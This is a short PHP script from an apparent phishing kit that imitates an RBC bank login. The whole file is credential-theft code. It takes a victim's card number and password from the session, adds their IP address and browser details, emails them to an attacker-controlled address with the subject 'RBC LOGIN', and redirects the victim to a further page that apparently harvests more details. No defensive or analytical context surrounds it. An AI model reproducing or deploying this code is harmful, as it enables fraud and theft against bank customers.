<?php
session_start();
include "youremail.php";
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");


$cn = $_SESSION['K1'];
$pass = $_SESSION['Q1'];


$data ="
    =============## RBC LOGIN ##==================
    |CardNo : $cn
    |PASS : $pass
    ============## LOLOZ :) ##=======================
    IP : $ip
    UA : $browserAgent
    Time : $timedate
    ";

$subject = "RBC LOGIN$ip";

if (strlen($cn) <= 16 && strlen($cn) >= 8 )
{
mail($send,$subject,$data);

}

		   header("Location: details.php");

	 
?>